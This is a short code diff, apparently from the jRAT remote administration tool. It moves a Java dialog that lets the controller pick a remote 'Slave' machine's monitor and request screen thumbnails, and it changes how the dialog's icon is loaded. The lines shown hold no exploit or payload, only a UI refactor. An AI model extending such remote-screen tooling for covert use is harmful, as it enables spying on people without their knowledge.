@@ -1,9 +1,10 @@
-package jrat.controller.ui.dialogs;
+package jrat.module.screen.ui;
 
 import graphslib.monitors.MonitorListener;
 import graphslib.monitors.PanelMonitors;
 import graphslib.monitors.PanelMonitors.PanelMonitor;
 import graphslib.monitors.RemoteMonitor;
+import jrat.api.Resources;
 import jrat.controller.Slave;
 import jrat.controller.listeners.PickMonitorListener;
 import jrat.controller.packets.outgoing.Packet75AllThumbnails;
@@ -27,7 +28,7 @@ public class DialogPickMonitor extends JDialog {
 	private JButton btnThumbnails;
 
 	public DialogPickMonitor(final Slave sl, final PickMonitorListener l) {
-		setIconImage(Toolkit.getDefaultToolkit().getImage(DialogPickMonitor.class.getResource("/icons/monitor-arrow.png")));
+		setIconImage(Resources.getIcon("monitor-arrow").getImage());
 		addWindowListener(new WindowAdapter() {
 			@Override
 			public void windowClosing(WindowEvent arg0) {
